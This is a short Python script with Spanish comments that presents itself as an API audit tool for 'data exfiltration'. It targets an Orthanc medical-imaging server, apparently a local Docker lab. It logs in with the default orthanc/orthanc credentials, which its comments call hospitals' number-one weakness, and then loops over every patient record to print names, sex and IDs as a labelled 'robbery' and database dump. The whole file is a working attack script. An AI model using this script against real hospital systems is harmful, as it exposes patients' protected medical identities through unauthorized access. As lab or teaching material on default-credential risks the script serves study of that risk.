import requests
import json

print("--- HERRAMIENTA DE AUDITORÍA API (EXFILTRACIÓN DE DATOS) ---")

# 1. CONFIGURACIÓN DEL OBJETIVO
# Atacamos el puerto Web (8042), no el DICOM.
URL_BASE = "http://localhost:8042"

# Credenciales por defecto (La vulnerabilidad #1 en hospitales)
# Si el hospital no cambia esto, es puerta abierta.
USUARIO = "orthanc"
PASSWORD = "orthanc"

# 2. OBTENER LISTA DE PACIENTES (Reconocimiento)
endpoint_pacientes = f"{URL_BASE}/patients"

try:
    print(f"[1] Conectando a {endpoint_pacientes}...")
    # Hacemos una petición GET (como el navegador) pero con código
    respuesta = requests.get(endpoint_pacientes, auth=(USUARIO, PASSWORD))
    
    # Verificamos si entramos (Código 200 = OK)
    if respuesta.status_code == 200:
        lista_ids = respuesta.json() # Convertimos el texto a lista Python
        print(f"[+] Acceso concedido. Se encontraron {len(lista_ids)} pacientes.")
    elif respuesta.status_code == 401:
        print("[-] Fallo de autenticación. Contraseña incorrecta.")
        exit()
    else:
        print(f"[-] Error desconocido: {respuesta.status_code}")
        exit()

    # 3. EXTRACCIÓN MASIVA (El Robo)
    print("\n[2] INICIANDO EXTRACCIÓN DE DATOS SENSIBLES...")
    print("-" * 60)
    print(f"{'ID ORTHANC':<40} | {'NOMBRE REAL':<20} | {'SEXO'}")
    print("-" * 60)

    for id_paciente in lista_ids:
        # Por cada ID, consultamos sus detalles específicos
        url_detalle = f"{URL_BASE}/patients/{id_paciente}"
        datos_paciente = requests.get(url_detalle, auth=(USUARIO, PASSWORD)).json()
        
        # Navegamos el JSON para buscar los tags DICOM "MainDicomTags"
        tags = datos_paciente.get("MainDicomTags", {})
        
        nombre_real = tags.get("PatientName", "DESCONOCIDO")
        sexo = tags.get("PatientSex", "?")
        id_medico = tags.get("PatientID", "SIN_ID")
        
        print(f"{id_paciente:<40} | {nombre_real:<20} | {sexo}")
        
    print("-" * 60)
    print("[SUCCESS] Volcado de base de datos completado.")

except requests.exceptions.ConnectionError:
    print("[-] Error: No se puede conectar al servidor. ¿Está Docker corriendo?")